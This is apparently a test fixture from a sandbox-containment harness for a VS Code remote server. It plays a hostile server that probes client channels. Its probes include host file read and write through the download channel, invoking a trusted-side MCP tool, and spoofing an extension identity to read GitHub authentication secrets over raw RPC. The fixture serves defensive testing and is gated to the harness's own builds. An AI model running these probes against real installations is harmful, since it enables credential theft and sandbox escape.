// Rogue REH probes: the server side of the boundary, attacking the client.
//
// Under our threat model the REH server process runs inside the tab, so it is
// hostile. It reaches surfaces the extension host cannot:
//
//   * channels the CLIENT registers on the remote connection and the server
//     calls directly (download, mcpGatewayToolBroker). These never pass through
//     RPCProtocol, so a MainThread*-only filter does not see them at all.
//   * raw MainThread* RPC with arguments no public API would produce, notably a
//     spoofed extension identity.
//
// Loaded by the test-only hook test/containment/rogue-reh/serverServices-hook.patch, which
// only the `containment` test build variant carries (test/builds/variants.json; never
// patches/series). It arms only when the harness stages a run in the tab:
// ~/.seclab-test/rogue-reh/{targets,probes.js,probe-safety.js}, targets holding a per-run
// nonce (arm), the run directory (run) and an expiry (until). It is a fixture, never shipped
// behaviour, and it only ever runs against our own test builds.
//
// Evidence goes to $SECLAB_ROGUE_REH_OUT/reh-probes.json (the hook sets it to
// ~/.seclab-test/rogue-reh/evidence), in the same shape as
// the extension-side probes so check-probes.ts can apply the same rules.

'use strict';

const fs = require('fs');
const path = require('path');
const safety = require('./probe-safety.js');

const SUCCEEDED = 'succeeded';
const DENIED = 'denied';
const ERROR = 'error';

function classify(err) {
	const msg = String((err && err.message) || err);
	// A safety refusal is a harness fault, never containment.
	if (err && err.seclabSafety) {
		return { outcome: ERROR, detail: msg };
	}
	if (/seclab: denied|not allowed in a sandboxed|unsupported operation|channel not found/i.test(msg)) {
		return { outcome: DENIED, detail: msg };
	}
	return { outcome: ERROR, detail: msg };
}

async function probe(results, id, policyRef, fn) {
	try {
		const detail = await fn();
		results.push({
			id, policyRef, outcome: SUCCEEDED,
			detail: typeof detail === 'string' ? detail : JSON.stringify(detail ?? null),
		});
	} catch (err) {
		const { outcome, detail } = classify(err);
		results.push({ id, policyRef, outcome, detail });
	}
}

/**
 * @param socketServer the server's SocketServer; getChannel(name, router)
 *   returns a proxy to a channel the CLIENT registered.
 * @param router a StaticRouter selecting the renderer connection.
 */
async function runRehProbes(socketServer, router) {
	const results = [];
	const ctx = safety.context();
	if (!ctx.armed) {
		return [{ id: 'harness', policyRef: '', outcome: ERROR, detail: `not armed: ${ctx.reason}` }];
	}

	// --- download channel ----------------------------------------------------
	// DownloadServiceChannel revives BOTH URIs from arguments the server sends,
	// so the trusted side fetches a source we name and writes to a destination
	// we name. Reading a host path we could not otherwise see proves host FS
	// read; writing a marker proves host FS write.
	const download = () => socketServer.getChannel('download', router);
	await probe(results, 'channel-download-host-read', 'chan:download', async () => {
		const dest = safety.safeWrite(ctx, `${ctx.marker}.download-read`, 'download dest');
		safety.note(ctx, dest);
		await download().call('download', [
			{ scheme: 'file', path: safety.safePath(ctx, ctx.canary, 'download source') },
			{ scheme: 'file', path: dest },
		]);
		return fs.existsSync(dest) ? fs.readFileSync(dest, 'utf8') : 'call returned without error';
	});
	await probe(results, 'channel-download-host-write', 'chan:download', async () => {
		const dest = safety.safeWrite(ctx, `${ctx.marker}.download`, 'download dest');
		safety.note(ctx, dest);
		await download().call('download', [
			{ scheme: 'file', path: safety.safePath(ctx, ctx.canary, 'download source') },
			{ scheme: 'file', path: dest },
		]);
		return dest;
	});

	// --- MCP gateway tool broker --------------------------------------------
	// callToolForServer invokes a tool hosted on the TRUSTED side, which is a
	// host process holding host credentials, with arguments we choose.
	const mcp = () => socketServer.getChannel('mcpGatewayToolBroker', router);
	await probe(results, 'channel-mcp-list-servers', 'chan:mcpGatewayToolBroker',
		async () => await mcp().call('listServers', [{}]));
	await probe(results, 'channel-mcp-call-tool', 'chan:mcpGatewayToolBroker',
		async () => await mcp().call('callToolForServer', [{
			serverId: process.env.SECLAB_PROBE_MCP_SERVER || 'host-probe',
			toolName: process.env.SECLAB_PROBE_MCP_TOOL || 'run',
			// Marker only. A tool invocation is the escape being demonstrated;
			// the payload must not also be an attack.
			arguments: { command: safety.markerCommand(ctx, '.mcp') },
		}]));

	// --- raw RPC: spoofed extension identity ---------------------------------
	// $getKeys/$getPassword take the extension id as an ARGUMENT, so a hostile
	// host can name a UI-side extension and enumerate, then read, its secrets.
	// No public API can express this, which is why it lives here.
	if (typeof globalThis.__seclabMainThreadRpc === 'function') {
		const rpc = globalThis.__seclabMainThreadRpc;
		await probe(results, 'rpc-secret-identity-spoof', 'rpc:MainThreadSecretState.$getKeys',
			async () => {
				const victim = 'vscode.github-authentication';
				const keys = await rpc('MainThreadSecretState', '$getKeys', [victim]);
				const values = {};
				for (const k of (keys || []).slice(0, 8)) {
					values[k] = await rpc('MainThreadSecretState', '$getPassword', [victim, k]);
				}
				return { victim, keys, values };
			});
		await probe(results, 'rpc-proxy-auth', 'rpc:MainThreadWorkspace.$lookupAuthorization',
			() => rpc('MainThreadWorkspace', '$lookupAuthorization',
				[{ scheme: 'https', host: 'example.invalid', port: 443 }]));
	} else {
		// Not a pass. An absent hook must never look like containment.
		for (const id of ['rpc-secret-identity-spoof', 'rpc-proxy-auth']) {
			results.push({
				id, policyRef: 'rpc:raw', outcome: ERROR,
				detail: 'no raw RPC hook; rebuild with the test-only rogue-REH patch',
			});
		}
	}

	// --- server-initiated terminal callback ----------------------------------
	// onExecuteCommand lets the server ask the client to run one of four
	// _remoteCLI commands. Driving it needs a live persistent pty id, which the
	// payload only has once a terminal exists in this tab, so it is recorded as
	// unimplemented rather than silently absent: an absent probe must never read
	// as containment.
	results.push({
		id: 'terminal-onexecutecommand',
		policyRef: 'chan:server_initiated.remoteTerminal.onExecuteCommand',
		outcome: ERROR,
		detail: 'not implemented: needs a live persistentProcessId from the remote terminal channel',
	});

	return results;
}

async function main(socketServer, router) {
	const out = process.env.SECLAB_ROGUE_REH_OUT;
	if (!out) {
		return;
	}
	let results;
	try {
		// Targets come from the safety context, which derives them from the
		// harness-supplied run directory. Nothing here is read from the
		// environment the tab controls.
		results = await runRehProbes(socketServer, router);
	} catch (err) {
		results = [{ id: 'harness', policyRef: '', outcome: ERROR, detail: String(err && err.stack) }];
	}
	try {
		fs.mkdirSync(out, { recursive: true });
		fs.writeFileSync(path.join(out, 'reh-probes.json'),
			JSON.stringify({ tab: process.env.SECLAB_TAB_ID || null, results }, null, 2));
	} catch { /* evidence is best effort */ }
}

module.exports = { runRehProbes, main };
